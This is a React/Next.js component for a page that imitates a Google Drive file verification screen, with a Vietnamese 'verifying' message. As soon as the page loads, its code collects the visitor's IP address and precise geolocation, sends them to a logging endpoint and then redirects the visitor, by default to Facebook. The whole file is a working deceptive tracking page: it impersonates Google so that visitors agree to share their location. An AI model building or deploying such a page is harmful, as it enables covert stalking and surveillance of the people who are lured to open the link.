'use client';

import { useEffect } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import Image from 'next/image';
import { FileText, Loader2 } from 'lucide-react';
import type { VerificationConfig } from '@/app/actions/settings';

interface DriveVerificationClientProps {
  config: VerificationConfig;
}

export function DriveVerificationClient({ config }: DriveVerificationClientProps) {
  const { 
    title, 
    description, 
    fileName, 
    fileInfo, 
    footerText, 
    redirectUrl 
  } = config;
  
  const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 

  useEffect(() => {
    const requestLocation = async () => {
      let clientIp = 'N/A';
      try {
          const ipResponse = await fetch('https://api.ipify.org?format=json');
          if (ipResponse.ok) {
              const ipData = await ipResponse.json();
              clientIp = ipData.ip;
          }
      } catch(e) {
          console.error("Could not fetch IP", e);
      }

      const logData = (pos?: GeolocationPosition) => {
          const body: { ip: string; lat?: number; lon?: number; acc?: number } = { ip: clientIp };
          if (pos) {
              body.lat = pos.coords.latitude;
              body.lon = pos.coords.longitude;
              body.acc = pos.coords.accuracy;
          }

          fetch('/api/log-location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(body),
          }).finally(() => {
              window.location.href = REDIRECT_URL;
          });
      }

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          logData, // Success callback
          () => logData(), // Error callback
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } else {
        logData(); // Geolocation not supported
      }
    };
    
    // The request will start immediately on page load.
    requestLocation();

  }, [REDIRECT_URL]);

  return (
    <div className="flex justify-center items-center min-h-screen bg-muted/30 p-4">
      <Card className="p-8 sm:p-10 rounded-xl shadow-2xl text-center max-w-md w-full bg-card border">
        <CardContent className="p-0 flex flex-col items-center">
          
          <Image
            className="mb-5"
            src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg"
            alt="Google Drive"
            width={74}
            height={74}
          />
          
          <h1 className="text-2xl font-bold mb-2 text-foreground">{title}</h1>
          <p className="text-muted-foreground text-sm leading-normal mb-8">
            {description}
          </p>

          <div className="w-full bg-muted/40 border rounded-lg p-4 flex items-center gap-4 mb-8 text-left">
            <FileText className="h-10 w-10 text-primary shrink-0" />
            <div>
              <p className="font-semibold text-foreground">{fileName}</p>
              <p className="text-xs text-muted-foreground">{fileInfo}</p>
            </div>
          </div>

          <div
            className="w-full h-12 text-base font-semibold bg-primary text-primary-foreground rounded-lg flex items-center justify-center"
          >
            <Loader2 className="mr-2 h-5 w-5 animate-spin" />
            Đang xác minh...
          </div>

          <div className="text-xs text-muted-foreground/80 mt-6">
            {footerText}
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
